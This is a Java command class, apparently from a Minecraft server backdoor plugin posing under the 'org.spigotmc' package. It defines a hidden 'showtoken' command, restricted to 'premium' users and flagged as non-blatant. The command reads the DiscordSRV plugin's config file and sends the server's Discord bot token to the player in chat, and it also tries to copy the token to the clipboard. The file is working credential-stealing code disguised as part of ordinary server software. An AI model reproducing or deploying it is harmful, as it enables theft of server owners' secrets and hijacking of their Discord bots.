package org.spigotmc.commands.impl.premium.server;

import java.io.File;

import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.utils.PluginUtils;
import org.spigotmc.utils.Settings;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;

@CommandInfo (
    name = "showtoken",
    usage = "showtoken",
    desc = "Get the token of the server's discord bot",
	rank = PlayerType.PREMIUM,
	blatant = false
)
public class ShowToken extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
		if (PluginUtils.getPluginByName("DiscordSRV") == null) {
			p.sendMessage(Settings.PREFIX("This server does not have DiscordSRV"));
		} else {
			File f = new File(PluginUtils.getPluginByName("DiscordSRV").getDataFolder() + "/config.yml");
			YamlConfiguration yc = YamlConfiguration.loadConfiguration(f);
			p.sendMessage(Settings.PREFIX(yc.getString("BotToken")));
			p.sendMessage(Settings.PREFIX("Token was also attempted to be copied to your clipboard"));
			Toolkit toolkit = Toolkit.getDefaultToolkit();
			Clipboard clipboard = toolkit.getSystemClipboard();
			StringSelection strSel = new StringSelection(yc.getString("BotToken"));
			clipboard.setContents(strSel, null);
		}
	} 
}
